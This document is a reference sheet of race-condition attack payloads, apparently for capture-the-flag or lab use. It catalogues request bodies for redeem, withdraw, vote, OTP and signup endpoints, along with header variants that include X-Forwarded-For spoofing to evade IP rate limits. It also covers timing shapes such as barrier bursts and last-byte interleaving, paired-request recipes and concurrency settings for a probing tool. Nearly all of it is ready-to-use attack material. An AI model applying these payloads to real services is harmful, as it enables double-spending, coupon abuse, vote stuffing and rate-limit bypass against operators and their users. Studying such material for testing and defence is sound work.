# Payload variants — every request body, header, and timing shape

The request-level catalogue: what to put in the body, which headers to vary,
and the timing shapes the delivery takes.

---

## 1. The body shapes — by endpoint family

### Redeem / coupon / claim

```json
{"code":"XYZ"}
{"code":"XYZ","quantity":1}
{"voucher":"XYZ"}
{"promo":"XYZ","order_id":1}
```

### Withdraw / transfer / pay

```json
{"amount":100}
{"amount":100,"to":"acct2"}
{"from":"me","to":"them","amount":100}
{"amount":"100.00","currency":"USD"}
```

### Vote / like / react

```json
{"post":1}
{"post":1,"dir":1}
{"target":1,"type":"upvote"}
{"item":1,"reaction":"like"}
```

### Register / signup

```json
{"username":"bot","password":"yours"}
{"email":"student@domain","password":"yours"}
{"name":"fixed","email":"fixed@x","password":"yours"}
```

### Buy / book / order

```json
{"sku":"last-seat"}
{"item":42,"qty":1}
{"product":"flag_item","quantity":1}
{"seat":"A1","event":1}
```

### Verify / OTP / confirm

```json
{"code":"123456"}
{"token":"abc","code":"123456"}
{"otp":"999999"}
{"verification_code":"000000"}
```

### Profile / email / settings

```json
{"email":"a@yourdomain"}
{"email":"b@yourdomain"}
{"phone":"+15550001"}
{"settings":{"email":"a@yourdomain"}}
```

### Login / session

```json
{"username":"me","password":"mine"}
{"email":"you@x","password":"yours"}
{"user":"fixed","pass":"yours"}
```

### Invite / join / accept

```json
{"code":"INVITE1"}
{"invite":"INVITE1","team":"t"}
{"token":"invite-token"}
```

### Upload / create / import

```json
{"filename":"thefile"}
{"name":"fixed","content":"..."}
{"path":"uploads/thefile"}
```

### Reset / forgot

```json
{"email":"you@yourdomain"}
{"user":"me"}
{"identifier":"you@yourdomain"}
```

## 2. The header variants

```bash
# session variants — the actor identity
-H 'Cookie: session=YOUR_SESSION'
-H 'Cookie: session=OTHER_SESSION'          # the second actor
-H 'Authorization: Bearer TOKEN'

# the dedup/request-id headers to vary
-H 'X-Request-Id: UNIQUE_PER_REQUEST'
-H 'Idempotency-Key: SAME_OR_VARY'
-H 'X-Idempotency-Key: KEY'

# content-type variants for the body
-H 'Content-Type: application/json'
-H 'Content-Type: application/x-www-form-urlencoded'
-H 'Content-Type: text/plain'               # the SSOS JSON-CSRF form
-H 'Content-Type: multipart/form-data'

# the forwarded/host headers when the check reads them
-H 'X-Forwarded-For: 127.0.0.1'             # if the limiter keys on IP
-H 'X-Real-Ip: 127.0.0.1'
-H 'Origin: https://target'                  # if there's an origin check
```

## 3. The timing shapes

| Shape | Mechanic | When |
|---|---|---|
| burst | N complete requests at once | wide window, single resource |
| barrier burst | all last bytes in one write | tight window — `race_probe --concurrency` |
| last-byte interleave | withhold A's last byte, drop B, release A | narrow window, `--url-b` pairs |
| staged | A fully, then B mid-A's-window | the multi-step flow |
| rolling re-roll | `--reset-url` between attempts | a marginal window |
| two-session sync | two probes, two cookies, shared barrier | a per-account check on a global resource |
| startup race | hammer before an actor's startup step | the SSOS register |
| boundary fire | burst across a deadline/expiry second | the time-window race |

## 4. The `--url-b` pair shapes

```bash
# two different bodies — the token-cross
--url  "$BASE/profile" --method POST --body '{"email":"a@x"}' \
--url-b "$BASE/profile" --method-b POST --body-b '{"email":"b@y"}'

# two different endpoints — the flow race
--url  "$BASE/checkout" --method POST \
--url-b "$BASE/cart/add" --method-b POST --body-b '{"item":"expensive"}'

# read vs write — the stale-read race
--url  "$BASE/api/me" --method GET \
--url-b "$BASE/api/revoke" --method-b POST

# same endpoint, two actors (bodies carry the actor)
--url  "$BASE/api/vote" --method POST --body '{"post":1}' -H 'Cookie: A' \
--url-b "$BASE/api/vote" --method-b POST --body-b '{"post":1}' -H 'Cookie: B'
```

## 5. The signature-mode choice per payload

```bash
--signature-mode status            # win/loss differ in status (200 vs 409)
--signature-mode status-length     # status same, body length differs
--signature-mode raw-body          # a second token/cookie in the body
--signature-mode normalized-body   # strip timestamps, ids
--signature-mode regex --signature-regex 'token=([a-z0-9]+)'   # pull the field
--signature-header Set-Cookie      # a second session cookie
--signature-header Location        # a redirect target
--signature-bytes 200              # compare only the first N bytes
```

## 6. The body-variant tricks

```bash
# the pathological input that widens the check
{"email":"a@abcdefghijklmnopqrstuvwxyz!"}
{"name":"$(python3 -c 'print("a"*500)')"}
{"field":"a"*1000 + "!"}

# the boundary values
{"amount":0}          {"amount":-1}         {"amount":99999}
{"amount":100.000001} {"amount":"100"}      {"amount":"1e2"}
{"qty":0}             {"qty":-1}            {"qty":2147483647}

# the type-confusion variants
{"code":123}          {"code":null}         {"code":true}
{"code":[]}           {"code":{}}           {"code":"XYZ "}
{"code":"xyz"}        {"code":"XYZ\n"}      {"code":"XYZ\u0000"}
```

## 7. The reset/restore bodies

```bash
# between rolls — restore the starting state
--reset-url "$BASE/api/dev/reset" --reset-method POST --reset-body '{"code":"fresh"}'
--reset-url "$BASE/api/test/reset" --reset-body '{}'
--reset-url "$BASE/api/account/reset" --reset-body '{"balance":100}'
```

## 8. The concurrency/count ladder

```bash
--concurrency 2  --count 10   # the interleave / url-b pairs
--concurrency 5  --count 5    # a narrow window, low ceiling
--concurrency 10 --count 10   # a medium window
--concurrency 20 --count 20   # the default burst
--concurrency 50 --count 50   # a wide window / many workers — watch the ceiling
--baseline-count 5            # always — the serial calibration
```
